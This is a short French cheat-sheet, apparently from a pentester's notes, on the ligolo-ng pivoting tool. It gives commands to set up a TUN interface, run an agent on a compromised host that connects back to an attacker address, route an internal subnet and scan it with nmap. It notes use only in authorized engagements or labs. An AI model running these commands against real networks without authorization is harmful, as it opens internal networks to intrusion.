---
titre: "ligolo-ng"
tags: [Outils, pivoting, tunneling, TUN]
source: https://github.com/nicocha30/ligolo-ng
---

# ligolo-ng

**Pivoting moderne via une interface TUN** (nicocha30). Au lieu d'un proxy SOCKS +
proxychains, ligolo-ng crée une **interface réseau** : on accède au réseau interne
comme s'il était routé localement → on lance `nmap`, un navigateur, n'importe quel
outil **sans proxychains**, plus simple et plus rapide.

> ⚠️ Uniquement en engagement/lab autorisé. Cf. `README`.

## Installation
```bash
# 2 binaires pré-compilés (releases) : proxy (attaquant) + agent (cible)
# Linux/Windows/macOS/BSD ; interface web multiplayer sur les versions récentes
```

## Utilisation
```bash
# 1) attaquant : préparer l'interface TUN + lancer le proxy
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                       # (ou -autocert avec Let's Encrypt)

# 2) cible compromise : lancer l'agent vers l'attaquant
./agent -connect 10.10.14.3:11601 -ignore-cert

# 3) dans la console proxy : sélectionner la session puis
ligolo-ng » session
ligolo-ng » start                        # démarre le tunnel
# 4) attaquant : router le sous-réseau interne vers l'interface ligolo
sudo ip route add 172.16.0.0/24 dev ligolo
```
Puis `nmap 172.16.0.0/24` fonctionne **directement**.

## Réflexe
Ne nécessite **pas** de droits admin côté agent. Idéal quand on doit lancer des
scans complets dans le réseau interne. Alternative plus « firewall-friendly » :
[[chisel]] (tunnel sur HTTP).
